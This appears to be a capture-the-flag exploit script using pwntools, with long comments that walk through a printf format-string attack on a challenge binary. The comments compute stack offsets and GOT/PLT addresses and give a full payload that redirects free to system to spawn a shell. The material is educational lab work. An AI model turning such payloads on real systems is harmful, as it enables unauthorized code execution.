#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("vuln")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

io = start()

# The vulnerability is in buy_stonks() at the printf(buffer).

# For this challenge we have to overwrite the free@got address with the system@got address.
# This is because there already is a call to system("date") and then we would like to overwrite
# the "date" argument with the string "/sh\0" which is exactly 4 bytes. 4 bytes is the maximum
# that we can overwrite something with using printf(buffer) format string attacks. Remember that
# we have to use decimal numbers in our format string attack.

# By opening the challenge in gdb and going into the function buy_stonks() where printf(buffer) is
# called, we can see that the rbp is 6 addresses from the rsp. We want to attack the rbp because the binary
# is using glibc version 2.27 where the rbp would point to _libc_start_main which is a 4 byte address that
# we can overwrite. Also because the binary is not using pie, addresses will be 3 bytes instead of 6.
# So let's take the distance from rbp to rsp
# which is 6, and add 6 more because 64 bit has 6 registers for arguments before putting them on the
# stack so that makes rbp argument number 12. By debugging in gdb we can see that rbp points to the
# 14th (+ 6) = 20th argument on the stack.

# After checking this out in gdb you can verify by selecting option "1" in the menu to buy stonks
# and when asked to input API key you can use: %14$p,%20$p

# We also need to find out what the argument to free() is so that we can overwrite this with "/sh\0"
# so that the system call will spawn our shell. We know that free(p) is called where p is the portfolio
# that is allocated in the beginning of main. At main+77 the result of initialize_portfolio() is moved
# into rax and then copied to the stack. Now we just have to figure out where it is on the stack when we
# call printf(buffer). In the beginning of buy_stonks() it is at 12 (+6) = 18th argument on the stack.

# Also, since the free function has not yet been called free@got points to free@plt
# we have to use free@plt. Since the gap from
# free@plt to system@plt is very small, we only have to change the lowest byte of free@plt


# free@got      : 0x602018 = 6299672 (decimal)
# system@got    : 0x602030 = 6299696 (decimal)

# free@plt      : 0x4006c0
# system@plt    : 0x4006f0
# distance      : 0x4006f0 - 0x4006c0 = 48 (decimal)

# What our task is:
# 1. Write free@got to the 12th position which points to the 20th which points to some memory
# 2. Now the 20th position points to free@got. We will overwrite this with system@plt
# 3. Overwrite portfolio *p with "/sh\0"

# %c is the char format specifier. We use 10 of these to get closer to the 12th argument
# free@got : 6299672-10 = 6299662
# payload part 1: %c%c%c%c%c%c%c%c%c%c%6299662c%n

# Now also overwrite last byte of free@plt which is 0x4006c0 and we write the value 0x6020f0 to it
# but choosing only %hnn meaning 1 byte (the least significant one) so it becomes 0x4006f0.
# 0x6020f0 - 0x602018 = 216 (decimal)

# payload part 2: %c%c%c%c%c%c%c%c%c%c%6299662c%n%216c%20$hhn

# Now we need to overwrite the first argument to free which is *p (18th on the stack).
# We will write 0x01006873 interpreted as string is sh\0\1
# 0x01006873 = 16803955 (decimal)
# previous writes: 6299672 (free) + 216 (f0) = 6299888
# final write: 16803955 - 6299888 = 10504067

# payload part 3 (final): %c%c%c%c%c%c%c%c%c%c%6299662c%n%216c%20$hhn%10504067c%18$n
# Works only on remote

io.interactive()
